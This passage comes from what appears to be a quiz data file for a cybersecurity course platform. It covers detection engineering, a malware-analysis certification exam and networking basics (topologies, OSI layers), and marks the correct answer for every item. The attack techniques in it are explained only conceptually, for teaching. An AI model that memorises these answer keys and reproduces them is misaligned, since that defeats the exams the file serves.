      { id: "de-q7-27", question: "How do you handle detection for techniques with many legitimate uses (e.g., PowerShell)?", options: ["Avoid deploying detections for these techniques entirely to prevent console alert fatigue", "Proposing to completely block access to these administration tools across all workstation", "Relying strictly on static signature matches of known malicious PowerShell script scripts", "Layering behavioral indicators, applying targeted allowlists, and correlating alert contexts"], correctAnswer: 3, explanation: "For dual-use tools: combine behavioral signals (unusual parent, encoded commands, network activity) with context (user, time, machine) and known-good exclusions." },
      { id: "de-q7-28", question: "What is the value of community-shared detection rules (e.g., SIGMA rules repository)?", options: ["Leveraging shared expertise to build fast coverage, adapting rules to local logging schemas", "Using external community rules directly in production systems without custom field matching", "Replacing all internal custom rules with community rules to minimize custom design tasks", "They only provide value to small security teams lacking resources for dedicated engineering"], correctAnswer: 0, explanation: "Community rules provide broad coverage quickly. Adapt them to your environment's log sources, field names, and false positive patterns for maximum value." },
      { id: "de-q7-29", question: "What should a detection engineering program's maturity assessment include?", options: ["Counting the absolute number of active rules and search queries configured in the SIEM daily", "Evaluating coverage breadth, alert quality, pipeline maturity, testing, and ATT&CK mapping", "Auditing the total size of the security operations team and their manual triage speed rates", "Documenting a complete inventory of hardware devices and endpoints connected to networks"], correctAnswer: 1, explanation: "Maturity spans coverage (ATT&CK mapping), quality (TP/FP rates), engineering practices (CI/CD, testing), documentation, and continuous improvement processes." },
      { id: "de-q7-30", question: "You need to detect a new zero-day technique with no known signatures. What approach do you take?", options: ["Wait for third-party security vendors to release standard signatures for perimeter controls", "Block all incoming network traffic at boundaries until vendor patches are officially issued", "Build behavioral detections matching the technique's actions rather than static indicators", "Ignore the threat vector entirely until official software security updates are deployed"], correctAnswer: 2, explanation: "Zero-days lack signatures. Detect the behavior — what the exploit does (process creation, file drops, network callbacks) rather than what the exploit looks like." }
    ]
  },
  // MALWARE ANALYSIS FUNDAMENTALS — FINAL CERTIFICATION EXAM
  {
    quizId: "ma-q7",
    courseId: "malware-analysis",
    title: "Malware Analysis Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Malware Analysis Fundamentals certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "ma-q7-1", question: "What is the difference between a virus and a worm?", options: ["They are functionally identical malware types that both spread without any user assistance needed", "A virus requires a host file to propagate; a worm self-propagates independently across networks", "Worms are far less dangerous than viruses because worms do not modify or corrupt target files", "Viruses only target and corrupt Microsoft Office documents while worms attack executable binaries"], correctAnswer: 1, explanation: "Viruses attach to and modify host files to spread. Worms are standalone programs that self-replicate across networks without needing a host file." },
      { id: "ma-q7-2", question: "Why is FlareVM preferred over a standard Windows VM for malware analysis?", options: ["It is available for free download, unlike enterprise-grade analysis platforms that require licensing fees", "Pre-configured with analysis tools (debuggers, disassemblers, PE tools) and security settings for safe analysis", "FlareVM delivers significantly better virtual CPU and RAM performance than standard Windows installations", "FlareVM is an official Microsoft product included with enterprise Windows Server licensing agreements"], correctAnswer: 1, explanation: "FlareVM comes pre-installed with tools like x64dbg, Ghidra, PEStudio, YARA, and is configured with analysis-friendly settings and disabled security features." },
      { id: "ma-q7-3", question: "What is the FIRST step when you receive a malware sample for analysis?", options: ["Execute the sample immediately in the VM to observe its live behavior before doing any static work", "Hash the sample (MD5, SHA-256) and check against threat intel databases like VirusTotal first", "Load the sample directly into Ghidra for disassembly and decompilation without checking reputation", "Delete the sample immediately and request a clean copy from the original source to avoid risk"], correctAnswer: 1, explanation: "Always hash first — if the sample is known, existing analysis saves time. Check VirusTotal, MalwareBazaar, and internal threat intel before spending analysis effort." },
      { id: "ma-q7-4", question: "What does the 'strings' command reveal during static analysis?", options: ["Only file system metadata like file size, timestamps, and permission attributes of the binary", "Human-readable text embedded in the binary: URLs, IPs, registry keys, error messages, and API names", "The complete internal PE file structure including section headers and the full import table listing", "Symmetric encryption keys used by the malware for C2 communication and payload decryption routines"], correctAnswer: 1, explanation: "Strings extraction reveals embedded text indicators: C2 URLs, file paths, registry keys, API names, error strings, and sometimes hardcoded credentials." },
      { id: "ma-q7-5", question: "What is a PE file's Import Address Table (IAT) and why is it important for analysis?", options: ["A runtime memory allocation table tracking heap allocations made during the process's execution", "Lists external DLL functions the binary calls — reveals capabilities like file I/O, networking, and crypto", "A binary compression lookup table used by the PE loader to restore packed sections to memory", "A Windows debugging feature populating symbol names from PDB files to aid crash investigation"], correctAnswer: 1, explanation: "The IAT shows which API functions the binary imports — CreateFile, InternetOpenUrl, CryptEncrypt reveal file access, network, and encryption capabilities." },
      { id: "ma-q7-6", question: "What is 'packing' in the context of malware?", options: ["Compressing malware attachments into ZIP archives for delivery as phishing email attachments", "Compressing and/or encrypting the binary to hide its true code and evade static analysis tools", "Bundling multiple independent malware components into a single container dropper installer file", "Adding or modifying binary metadata fields like timestamps and version strings to deceive analysts"], correctAnswer: 1, explanation: "Packers compress/encrypt the executable code. At runtime, a stub unpacks the original code into memory — this defeats static string and import analysis." },
      { id: "ma-q7-7", question: "How do you identify if a PE file is packed?", options: ["Check the binary filename for known packer names like 'upx_packed.exe' or 'themida_protected.exe'", "High entropy in sections, few imports, small IAT, packer signatures, and unusual section name anomalies", "Compare the file size in bytes against a database of known unpacked malware family size ranges", "Execute the binary and observe its behavior to determine if it runs an unpacking stub at startup"], correctAnswer: 1, explanation: "Packed indicators: high section entropy (>7.0), very few imports (just LoadLibrary/GetProcAddress), unusual section names (.upx, .packed), and small code sections." },
      { id: "ma-q7-8", question: "During dynamic analysis, what does ProcMon capture?", options: ["Raw network packet captures including all TCP/UDP payload data transmitted during malware execution", "Real-time file system, registry, process, and thread activity with full stack traces and timestamps", "Physical RAM memory dumps of the infected process for offline forensic memory analysis workflows", "Only DNS query and response traffic from the malware process to identify C2 domain lookups"], correctAnswer: 1, explanation: "Process Monitor captures granular system activity: file creates/reads/writes, registry modifications, process/thread creation, and network connections with stack traces." },
      { id: "ma-q7-9", question: "What is API hooking in dynamic analysis?", options: ["Directly calling Windows API functions from the analysis harness to trigger specific malware code paths", "Intercepting API calls to monitor what functions malware invokes and with what parameters at runtime", "A standard software engineering pattern used to extend third-party library functionality in plugins", "Disabling specific Windows API functions to prevent malware from carrying out destructive operations"], correctAnswer: 1, explanation: "API hooking intercepts function calls (CreateFile, WriteProcessMemory, InternetConnect) to log parameters and behavior without modifying the malware." },
      { id: "ma-q7-10", question: "A malware sample checks for 'vmtoolsd.exe' and 'VBoxService.exe' processes. What is it doing?", options: ["Checking for Windows Update service processes to avoid running while system patches are downloading", "VM detection — anti-analysis technique to detect virtual machine environments and alter its behavior", "Scanning for security software processes like AV and EDR to decide whether to proceed with infection", "Searching for specific target process dependencies needed to inject its shellcode into a host process"], correctAnswer: 1, explanation: "Checking for VM-specific processes is a common anti-analysis technique. If detected, malware may exit, sleep, or behave benignly to evade sandbox analysis." },
      { id: "ma-q7-11", question: "What is the purpose of a sandbox in malware analysis?", options: ["A secure storage system for archiving malware samples and maintaining an indexed threat repository", "An automated dynamic execution environment that monitors behavior and generates analysis reports", "A secure IDE environment for writing and testing custom malware analysis and detection scripts", "A network-only isolation zone that blocks external connections while allowing internal host access"], correctAnswer: 1, explanation: "Sandboxes (Cuckoo, ANY.RUN, Joe Sandbox) automatically execute malware in isolated environments, monitoring all activity and generating behavioral reports." },
      { id: "ma-q7-12", question: "How do VBA macros typically deliver malware payloads?", options: ["By directly writing shellcode into executable memory sections of the Office host process immediately", "Auto_Open macros use PowerShell, WScript, or certutil to download and execute payloads from C2 servers", "By transmitting credentials captured from the Office application directly to attacker-controlled servers", "Payloads are delivered exclusively via DNS TXT record queries resolved by the macro at execution time"], correctAnswer: 1, explanation: "Malicious macros trigger on document open, then use shell commands (PowerShell, WScript) to download second-stage payloads from attacker-controlled servers." },
      { id: "ma-q7-13", question: "What is 'code injection' and name two common techniques?", options: ["Writing and compiling new detection code inside an IDE to analyze malware behavior patterns", "Inserting code into another process's memory space — DLL injection and process hollowing are common", "A web application security vulnerability class that includes SQLi and XSS attack injection patterns", "Embedding malicious HTML payloads into email bodies to execute JavaScript in victim email clients"], correctAnswer: 1, explanation: "Code injection inserts malicious code into legitimate processes. DLL injection loads a malicious DLL; process hollowing replaces a suspended process's code." },
      { id: "ma-q7-14", question: "In x86 assembly, what does 'CALL' instruction do?", options: ["Terminates the currently running program and returns control to the operating system process manager", "Pushes the return address onto the stack and transfers execution to the target function address", "Dynamically allocates a specified number of bytes on the heap for temporary buffer storage use", "Compares two register values and sets the CPU status flags for subsequent conditional branch testing"], correctAnswer: 1, explanation: "CALL pushes EIP (next instruction address) onto the stack as return address, then jumps to the target function. RET pops the address to return." },
      { id: "ma-q7-15", question: "What is Ghidra's decompiler useful for?", options: ["Compiling analyzed assembly back into optimized native machine code for performance benchmarking", "Converting assembly instructions back to approximate C/C++ source code for much easier analysis", "Capturing live network traffic during dynamic analysis to reconstruct the malware's C2 protocol", "Automated runtime debugging of compiled binaries with built-in breakpoint and stepping functionality"], correctAnswer: 1, explanation: "Ghidra's decompiler translates disassembly into pseudo-C code, making it much easier to understand program logic without reading raw assembly." },
      { id: "ma-q7-16", question: "What is the purpose of setting breakpoints in a debugger during malware analysis?", options: ["Permanently halting malware execution to prevent any further destructive actions on the system", "Pausing execution at specific addresses to inspect memory, registers, and variable values at that point", "Injecting additional code bytes into the running process to redirect execution to an analysis hook", "Intercepting all outbound network connection attempts to capture C2 protocol traffic for examination"], correctAnswer: 1, explanation: "Breakpoints pause execution so you can examine the current state — register values, memory contents, stack — crucial for understanding malware behavior." },
      { id: "ma-q7-17", question: "How does ransomware typically encrypt files?", options: ["Using simple single-byte XOR encryption applied to each file with a hardcoded key in the binary", "Hybrid encryption: symmetric AES encrypts files, then asymmetric RSA encrypts the symmetric key", "Applying ROT13 character substitution cipher encoding to each file's raw byte content on disk", "Encoding file contents using Base64 encoding and appending a ransom note to each modified file"], correctAnswer: 1, explanation: "Ransomware uses hybrid encryption for speed: AES encrypts each file quickly, then RSA encrypts the AES key — only the attacker's RSA private key can decrypt." },
      { id: "ma-q7-18", question: "What is a YARA rule's 'meta' section used for?", options: ["Defining the boolean logic conditions that determine when a file matches the YARA signature rule", "Storing descriptive metadata: author, date, description, threat level, malware family, and references", "Listing all filesystem paths and directories that the YARA scanner should search during a scan run", "Configuring the scanner performance options and threading parameters for production deployment\n"], correctAnswer: 1, explanation: "The meta section stores rule metadata for documentation — author, creation date, malware family, description, references, and severity classification." },
      { id: "ma-q7-19", question: "What is 'process hollowing'?", options: ["A technique for deleting a running process's executable file from disk while it remains in memory", "Creating a suspended legitimate process, unmapping its code, and injecting malicious code in its place", "A memory leak condition where a process gradually loses access to all of its allocated heap memory", "A standard Windows process lifecycle event where a process terminates and cleans up all its resources"], correctAnswer: 1, explanation: "Process hollowing creates a suspended legitimate process (e.g., svchost.exe), hollows out its code section, writes malicious code, and resumes — masquerading as legitimate." },
      { id: "ma-q7-20", question: "How do you safely extract IOCs from a malware sample?", options: ["Execute the sample directly on a production system and use SIEM to collect all generated telemetry", "Use static analysis tools in an isolated VM to extract strings, hashes, embedded URLs, and C2 infrastructure", "Submit the hash to the malware author's support channel and request a list of indicators directly", "Use only VirusTotal's community-submitted detection rules and skip any local analysis entirely"], correctAnswer: 1, explanation: "In an isolated analysis VM: extract strings, decode encoded data, parse PE resources, and collect hashes, IPs, domains, URLs, mutexes, and registry keys." },
      { id: "ma-q7-21", question: "What is the significance of the PE file's timestamp?", options: ["Records the exact time the malware file was downloaded to the victim's machine from the internet", "The compilation timestamp indicating when the malware was built, though it is commonly forged by actors", "Stores the filesystem creation time that Windows assigned when the file was first written to disk", "Records the date and time the file was first submitted to VirusTotal for multi-engine scanning"], correctAnswer: 1, explanation: "The PE timestamp shows compilation time, helping estimate creation date and correlate with campaigns. However, sophisticated actors routinely forge this value." },
      { id: "ma-q7-22", question: "What technique do malware authors use to make reverse engineering harder?", options: ["Writing clean, well-documented code with descriptive function names to mislead analysis tools", "Code obfuscation: dead code insertion, control flow flattening, string encryption, and anti-debug tricks", "Releasing the malware as open-source code so defenders waste time analyzing decoy repositories", "Adding detailed inline comments and variable descriptions to confuse automated code analysis tools"], correctAnswer: 1, explanation: "Obfuscation techniques include junk code insertion, opaque predicates, string encryption, API hashing, and anti-debug checks to slow reverse engineering." },
      { id: "ma-q7-23", question: "What is a mutex in malware behavior and why do analysts care about it?", options: ["A proprietary binary container file format used for packaging and distributing malware components", "A named synchronization object — malware creates unique mutexes to prevent multiple instances, useful as IOCs", "A network socket protocol used for establishing secure encrypted tunnels between malware and its C2", "A cryptographic algorithm variant used to generate pseudo-random keys for per-file encryption operations"], correctAnswer: 1, explanation: "Malware creates named mutexes to ensure single execution. These unique names serve as reliable IOCs for detection and can identify malware families." },
      { id: "ma-q7-24", question: "How does a rootkit differ from a standard trojan?", options: ["Rootkits are significantly less dangerous because they only passively monitor rather than modify systems", "Rootkits operate at kernel level or below, actively hiding their presence from the OS and security tools", "Rootkits and trojans are completely identical malware types with no functional or architectural difference", "Rootkits exclusively target Linux systems, while trojans are the only malware type targeting Windows\n"], correctAnswer: 1, explanation: "Rootkits modify the OS kernel or boot process to actively conceal malware presence — hiding processes, files, network connections from standard tools." },
      { id: "ma-q7-25", question: "What is the MITRE ATT&CK technique ID for 'Command and Scripting Interpreter: PowerShell'?", options: ["T1059.001 — PowerShell under Command and Scripting Interpreter, one of the most abused execution techniques", "T1053.005 — Scheduled Task/Job: Scheduled Task, for persistence via Windows Task Scheduler mechanisms", "T1547.001 — Registry Run Keys/Startup Folder, a registry-based persistence and privilege escalation technique", "T1055.012 — Process Injection: Process Hollowing, used to inject code into suspended legitimate processes"], correctAnswer: 0, explanation: "T1059.001 is the sub-technique for PowerShell under Command and Scripting Interpreter — one of the most commonly observed execution techniques." },
      { id: "ma-q7-26", question: "During analysis, you find the malware creates a service named 'WindowsUpdateSvc'. What technique is this?", options: ["A legitimate Windows Update operation that installs security patches and hotfixes on the system", "Persistence via Windows Service creation (T1543.003) using a name mimicking a legitimate Windows service", "A service discovery scan attempting to enumerate all registered Windows services on the local system", "Process injection into the Windows Update service process to steal its permissions and session token"], correctAnswer: 1, explanation: "Creating services with names mimicking legitimate Windows services is a common persistence technique (T1543.003) — provides automatic startup and SYSTEM privileges." },
      { id: "ma-q7-27", question: "What is the best approach for analyzing a multi-stage malware dropper?", options: ["Analyze only the initial dropper binary and assume the second stage behaves identically to it", "Analyze each stage separately: initial dropper, downloaded payload, and final payload with full IOC capture", "Skip all intermediate stages and focus exclusively on the final payload that performs the main action", "Execute the entire chain once in the sandbox and collect all data in a single automated analysis pass"], correctAnswer: 1, explanation: "Multi-stage malware requires analyzing each stage independently — each may have different C2s, techniques, and IOCs that are crucial for complete understanding." },
      { id: "ma-q7-28", question: "What does 'behavioral analysis' reveal that static analysis cannot?", options: ["The static file metadata attributes like file size, compilation timestamp, and code section entropy values", "Runtime behavior: actual C2 communication, decrypted strings, unpacked code, and real-time system changes", "The full import table listing all Windows API functions referenced in the binary's PE header section", "The exact file size in bytes of the binary stored on disk before it is loaded into memory by the loader"], correctAnswer: 1, explanation: "Dynamic/behavioral analysis reveals what actually happens at runtime — decrypted configurations, real C2 traffic, dropped files, and evasion technique triggers." },
      { id: "ma-q7-29", question: "How should a malware analysis report be structured for maximum SOC value?", options: ["Include only low-level technical assembly analysis with register states and stack frame diagrams", "Executive summary, IOCs (hashes, IPs, domains), behavioral indicators, ATT&CK mapping, and detections", "Simply list all discovered IOC values without any contextual explanation or recommended response actions", "Provide only visual screenshots of the analysis VM and sandbox output without written explanation"], correctAnswer: 1, explanation: "Effective reports include: summary for leadership, actionable IOCs for blocking, behavioral indicators for detection, ATT&CK mapping for context, and recommendations." },
      { id: "ma-q7-30", question: "You analyze a sample that checks the system language and exits if it's Russian, Ukrainian, or Kazakh. What does this indicate?", options: ["A legitimate software localization feature ensuring the application runs correctly on multilingual systems", "Likely an Eastern European cybercrime group avoiding prosecution by geofencing CIS country targets", "A translation module error where incorrect locale detection causes the program to exit unexpectedly", "Completely random conditional behavior with no deliberate intent behind the language-based exit logic"], correctAnswer: 1, explanation: "Many Eastern European cybercrime groups avoid targeting CIS nations to reduce law enforcement attention — language/locale checks are a common geofencing technique." }
    ]
  },
  // ==========================================
  // NETWORK FUNDAMENTALS QUIZZES
  // ==========================================
  {
    quizId: "nf-q1",
    courseId: "network-fundamentals",
    title: "Computer Networks Basics Quiz",
    description: "Test your knowledge of network types, topologies, and architecture.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q1-1", question: "What is the primary purpose of a computer network?", options: ["To increase the local CPU processing speed and RAM capacity of individual connected devices", "To enable communication and resource sharing between devices across a connected environment", "To protect individual endpoints from malware infections and unauthorized access attempts", "To physically store files and database records in a centralized on-premises server rack"], correctAnswer: 1, explanation: "A computer network connects devices to enable communication, data sharing, and resource sharing such as printers and internet access." },
      { id: "nf-q1-2", question: "Which type of network typically covers a single building or campus?", options: ["WAN — Wide Area Network spanning multiple cities, states, or entire countries through ISPs", "MAN — Metropolitan Area Network covering an entire city or large multi-campus environment", "LAN — Local Area Network covering a limited area such as a building, office, or campus", "PAN — Personal Area Network connecting personal devices within a very short range of meters"], correctAnswer: 2, explanation: "A LAN (Local Area Network) covers a limited area such as a building, office, or campus." },
      { id: "nf-q1-3", question: "What does WAN stand for?", options: ["Wireless Access Network — a radio-based protocol for connecting mobile devices to hotspots", "Wide Area Network — a network spanning large geographical areas connecting multiple LANs", "Web Application Node — a cloud computing term for distributed server-side application nodes", "Wired Automated Network — an enterprise term for managed switch-based cabled deployments"], correctAnswer: 1, explanation: "WAN stands for Wide Area Network — it spans large geographical areas, connecting multiple LANs across cities, countries, or continents." },
      { id: "nf-q1-4", question: "In a star topology, what happens if the central device fails?", options: ["Only the one device directly connected to the failed port loses its network connectivity", "The entire network goes down since all nodes depend on the central hub or switch", "The network topology automatically reconfigures itself to a mesh and routes around the failure", "Nothing changes — the remaining nodes communicate directly with each other peer-to-peer"], correctAnswer: 1, explanation: "In a star topology, all nodes connect through a central hub/switch. If it fails, the entire network loses connectivity." },
      { id: "nf-q1-5", question: "Which topology provides the highest redundancy?", options: ["Star — all devices connect to a single central switch or hub for simplified management", "Bus — all devices share a single backbone cable running the length of the network segment", "Ring — devices connect in a circular chain where data flows in one fixed direction", "Full Mesh — every node connects to every other node providing maximum path redundancy"], correctAnswer: 3, explanation: "Full mesh topology connects every node to every other node, providing maximum redundancy — if one link fails, data can route through alternative paths." },
      { id: "nf-q1-6", question: "What is a PAN (Personal Area Network)?", options: ["A citywide Metropolitan Area Network connecting multiple organizations across an urban area", "A short-range network within a few meters connecting personal devices like phones via Bluetooth", "A private Wide Area Network connecting branch offices over leased telecom infrastructure", "A public wireless access network available to visitors in hotels, airports, and coffee shops"], correctAnswer: 1, explanation: "A PAN operates within a very short range (typically a few meters) and connects personal devices like phones, headphones, and smartwatches via Bluetooth or USB." },
      { id: "nf-q1-7", question: "In a client-server architecture, what role does the server play?", options: ["The server only transmits outbound data streams and never receives requests from clients", "The server provides centralized resources and services to client devices upon their requests", "The server acts as a passive relay forwarding packets between network segments without processing", "The server exclusively stores encrypted backup copies of client data for disaster recovery"], correctAnswer: 1, explanation: "In client-server architecture, the server centralizes resources (files, apps, databases) and provides services upon client requests." },
      { id: "nf-q1-8", question: "What is the main disadvantage of a bus topology?", options: ["It is extremely expensive to install due to the high cost of specialized repeater hardware", "If the backbone cable fails or is damaged, the entire network loses connectivity immediately", "It requires significantly more cabling than a star or mesh topology for the same number of nodes", "The topology is physically limited to connecting only two devices at any given time"], correctAnswer: 1, explanation: "A bus topology uses a single backbone cable. If this cable fails or is damaged, all devices on the network lose connectivity." },
      { id: "nf-q1-9", question: "Which network type covers a metropolitan area, such as a city?", options: ["LAN — Local Area Network limited to a single building, floor, or small campus environment", "PAN — Personal Area Network operating within a very short range around individual users", "MAN — Metropolitan Area Network covering a city or large campus, larger than a LAN", "SAN — Storage Area Network connecting servers to high-speed storage arrays in data centers"], correctAnswer: 2, explanation: "A MAN (Metropolitan Area Network) covers a city or large campus, typically larger than a LAN but smaller than a WAN." },
      { id: "nf-q1-10", question: "What is the key advantage of peer-to-peer networking?", options: ["Provides centralized security management and policy enforcement for all connected endpoints", "No dedicated server required — every device acts as both client and server for shared resources", "Delivers significantly better performance and throughput for large enterprise-scale networks", "Makes it much easier to scale the network infrastructure to support thousands of concurrent users"], correctAnswer: 1, explanation: "In P2P, each device can share and access resources directly without requiring a dedicated server, making it simpler and cheaper for small networks." },
      { id: "nf-q1-11", question: "Which device connects different networks together and routes traffic between them?", options: ["Hub — a Layer 1 device that repeats incoming signals out all connected ports indiscriminately", "Switch — a Layer 2 device that forwards Ethernet frames based on MAC addresses within a LAN", "Router — a Layer 3 device that connects networks and routes packets using IP address tables", "Repeater — a Layer 1 device that amplifies and regenerates signals to extend cable distances"], correctAnswer: 2, explanation: "A router connects different networks (e.g., your LAN to the internet) and routes packets between them using IP addresses." },
      { id: "nf-q1-12", question: "What is a CAN (Campus Area Network)?", options: ["A network spanning multiple buildings in a university or corporate campus interconnecting LANs", "A specialized wireless network system installed inside a vehicle for driver and passenger use", "A cloud-hosted virtual network that spans globally distributed data centers and edge nodes", "A cable television distribution network delivering broadcast signals to residential subscribers"], correctAnswer: 0, explanation: "A CAN interconnects multiple LANs across buildings within a limited geographical area like a university campus or business park." },
      { id: "nf-q1-13", question: "In a ring topology, how does data travel?", options: ["Data is transmitted randomly to any available node without following a predetermined sequence", "Data travels sequentially in one direction (or both in dual-ring) from one node to the next", "Data flows exclusively outward from the central hub to each node through dedicated connections", "Data is broadcast simultaneously to all nodes in the ring at the same exact moment"], correctAnswer: 1, explanation: "In a ring topology, data travels sequentially from node to node in one direction (unidirectional) or both directions in a dual-ring configuration." },
      { id: "nf-q1-14", question: "What type of network is the Internet classified as?", options: ["LAN — Local Area Network covering a building, office, or small campus environment", "MAN — Metropolitan Area Network connecting devices across a single large city or urban area", "WAN — Wide Area Network, specifically the world's largest global interconnected network", "PAN — Personal Area Network for short-range wireless device connectivity like Bluetooth"], correctAnswer: 2, explanation: "The Internet is the world's largest WAN — a global network of interconnected networks spanning the entire planet." },
      { id: "nf-q1-15", question: "What is a hybrid topology?", options: ["A network design that uses exclusively wireless connections without any wired infrastructure", "A combination of two or more different topologies combining the advantages of each type", "A topology that only functions in cloud-hosted virtual network environments on rented infrastructure", "A topology with no central hub or switch device — all connections are made directly peer-to-peer"], correctAnswer: 1, explanation: "A hybrid topology combines multiple topologies (e.g., star-bus or star-ring) to leverage the advantages of each for complex network designs." }
    ]
  },
  {
    quizId: "nf-q2",
    courseId: "network-fundamentals",
    title: "OSI Model Quiz",
    description: "Assess your understanding of the 7-layer OSI model and data encapsulation.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q2-1", question: "How many layers does the OSI model have?", options: ["4 layers — matching the simplified TCP/IP model used in modern internet protocol design", "5 layers — Network Access, Internet, Transport, Session, and Application combined structure", "6 layers — Physical, Data Link, Network, Transport, Presentation, and Application in order", "7 layers — Physical, Data Link, Network, Transport, Session, Presentation, and Application"], correctAnswer: 3, explanation: "The OSI (Open Systems Interconnection) model has 7 layers: Physical, Data Link, Network, Transport, Session, Presentation, and Application." },
      { id: "nf-q2-2", question: "Which OSI layer is responsible for routing packets between networks?", options: ["Layer 1 — Physical layer handling raw bit transmission over cables and wireless signals", "Layer 2 — Data Link handling MAC addressing and frame delivery within the local segment", "Layer 3 — Network layer handling logical addressing and routing packets between networks", "Layer 4 — Transport layer managing end-to-end connections and data flow control between hosts"], correctAnswer: 2, explanation: "Layer 3 (Network) handles logical addressing (IP) and routing packets between different networks." },
      { id: "nf-q2-3", question: "What is the PDU (Protocol Data Unit) at the Transport layer?", options: ["Bit — the raw binary data unit transmitted over physical media at the Physical layer", "Frame — the Layer 2 Data Link unit including MAC addresses and FCS error checking", "Packet — the Layer 3 Network unit including source and destination IP address headers", "Segment — the Layer 4 Transport unit used by TCP or datagram used by UDP"], correctAnswer: 3, explanation: "At Layer 4 (Transport), data is encapsulated into segments (TCP) or datagrams (UDP)." },
      { id: "nf-q2-4", question: "Which layer converts data into electrical signals, light pulses, or radio waves?", options: ["Physical — Layer 1 that converts bits into electrical, optical, or wireless transmission signals", "Data Link — Layer 2 that creates frames and handles MAC addressing within the local segment", "Network — Layer 3 that adds IP addressing and routing logic for inter-network packet delivery", "Application — Layer 7 that provides user-facing services like HTTP, FTP, and email protocols"], correctAnswer: 0, explanation: "Layer 1 (Physical) deals with the actual transmission of raw bits over a medium — electrical, optical, or wireless signals." },
      { id: "nf-q2-5", question: "At which OSI layer do switches primarily operate?", options: ["Layer 1 — Physical layer where hubs and repeaters operate by repeating all incoming signals", "Layer 2 — Data Link layer where switches use MAC addresses to forward frames in a LAN", "Layer 3 — Network layer where routers use IP addresses to route packets between networks", "Layer 4 — Transport layer where TCP and UDP provide end-to-end communication services"], correctAnswer: 1, explanation: "Switches operate primarily at Layer 2 (Data Link), using MAC addresses to forward frames within a network." },
      { id: "nf-q2-6", question: "Which layer handles data encryption, compression, and format translation?", options: ["Session — Layer 5 that establishes, manages, and terminates communication sessions between apps", "Presentation — Layer 6 that handles data formatting, encryption, decryption, and compression", "Application — Layer 7 that provides network services and interfaces directly to user applications", "Transport — Layer 4 that provides end-to-end reliable data delivery with flow and error control"], correctAnswer: 1, explanation: "Layer 6 (Presentation) handles data formatting, encryption/decryption, compression, and character encoding translation." },
      { id: "nf-q2-7", question: "What is the purpose of the Session layer?", options: ["Handles the physical transmission of raw bits over cables, fiber, and wireless radio signals", "Routes packets between different networks using logical IP addressing and routing protocols", "Manages establishing, synchronizing, and terminating communication sessions between applications", "Provides the user interface to the network with protocols like HTTP, DNS, and SMTP"], correctAnswer: 2, explanation: "Layer 5 (Session) establishes, manages, and terminates communication sessions between applications, handling dialog control and synchronization." },
      { id: "nf-q2-8", question: "What is data encapsulation in networking?", options: ["Compressing packet data using algorithms like GZIP to reduce storage and transmission overhead", "Wrapping data with protocol-specific headers at each layer as it moves down the OSI stack", "Encrypting user payload data with TLS certificates for secure transmission over the internet", "Splitting large data streams into equal-sized chunks for parallel transmission across multiple links"], correctAnswer: 1, explanation: "Encapsulation adds protocol-specific headers (and sometimes trailers) at each OSI layer as data moves from Application to Physical." },
      { id: "nf-q2-9", question: "Which layer provides end-to-end communication and error recovery?", options: ["Network — Layer 3 that routes packets between networks using logical IP addressing schemes", "Transport — Layer 4 that provides end-to-end reliable communication with error recovery", "Session — Layer 5 that manages communication sessions between application processes on hosts", "Data Link — Layer 2 that delivers frames within the local network segment using MAC addresses"], correctAnswer: 1, explanation: "Layer 4 (Transport) provides end-to-end reliable communication with features like error detection, flow control, and retransmission (TCP)." },
      { id: "nf-q2-10", question: "The PDU at Layer 2 is called a:", options: ["Segment — the Layer 4 Transport unit used by TCP for reliable end-to-end data delivery", "Packet — the Layer 3 Network unit containing IP source and destination address information", "Frame — the Layer 2 Data Link unit that includes MAC addresses and an FCS trailer", "Bit — the Layer 1 Physical unit representing a single binary digit of raw data transmitted"], correctAnswer: 2, explanation: "At the Data Link layer (Layer 2), data is encapsulated into frames, which include MAC addresses and error-checking (FCS)." },
      { id: "nf-q2-11", question: "HTTP, FTP, and SMTP operate at which OSI layer?", options: ["Transport — Layer 4 that manages end-to-end connections using TCP and UDP protocols", "Session — Layer 5 that handles dialog control and session management between applications", "Presentation — Layer 6 that converts data formats, handles encryption, and compression tasks", "Application — Layer 7 that provides user-facing services including web, file transfer, and email"], correctAnswer: 3, explanation: "HTTP, FTP, SMTP, DNS, and other user-facing protocols operate at Layer 7 (Application)." },
      { id: "nf-q2-12", question: "What mnemonic helps remember the OSI layers from bottom to top?", options: ["All People Seem To Need Data Processing — App, Presentation, Session, Transport, Network, Data, Physical", "Please Do Not Throw Sausage Pizza Away — Physical, Data Link, Network, Transport, Session, Presentation, Application", "Do People Always Talk So Nice Politely — Data, Physical, Application, Transport, Session, Network, Presentation", "Never Say Anything To People During Parties — Network, Session, Application, Transport, Physical, Data, Presentation"], correctAnswer: 1, explanation: "'Please Do Not Throw Sausage Pizza Away' represents Physical, Data Link, Network, Transport, Session, Presentation, Application." },
      { id: "nf-q2-13", question: "Which two layers are combined in the TCP/IP model's Network Access layer?", options: ["Network and Transport — Layers 3 and 4 that handle IP routing and end-to-end delivery", "Physical and Data Link — OSI Layers 1 and 2 combined into the single Network Access layer", "Session and Presentation — Layers 5 and 6 that handle sessions and data format conversion", "Application and Session — Layers 7 and 5 combined into the single TCP/IP Application layer"], correctAnswer: 1, explanation: "The TCP/IP model combines OSI Layers 1 (Physical) and 2 (Data Link) into a single Network Access (or Link) layer." },
      { id: "nf-q2-14", question: "What does de-encapsulation refer to?", options: ["Adding new protocol headers and trailers to data at each layer on the sending host side", "Removing protocol headers and trailers at each layer as data moves up the stack on the receiver", "Converting digital data signals back into analog waveforms for legacy copper telephone lines", "Compressing outbound packet data using lossless algorithms to reduce bandwidth consumption"], correctAnswer: 1, explanation: "De-encapsulation is the reverse process — stripping away protocol headers/trailers at each layer as data moves up the OSI stack at the receiving host." },
      { id: "nf-q2-15", question: "Which OSI layer adds a trailer containing the FCS (Frame Check Sequence)?", options: ["Physical — Layer 1 that transmits raw bits as electrical or optical signals over the medium", "Data Link — Layer 2 that adds both a header with MAC addresses and a trailer with FCS", "Network — Layer 3 that adds IP addressing and routing information to create network packets", "Transport — Layer 4 that adds TCP/UDP headers for port-based end-to-end communication"], correctAnswer: 1, explanation: "The Data Link layer (Layer 2) adds both a header (with MAC addresses) and a trailer containing the FCS for error detection." }
    ]
  },
  {
    quizId: "nf-q3",
    courseId: "network-fundamentals",
    title: "TCP/IP Protocol Suite Quiz",
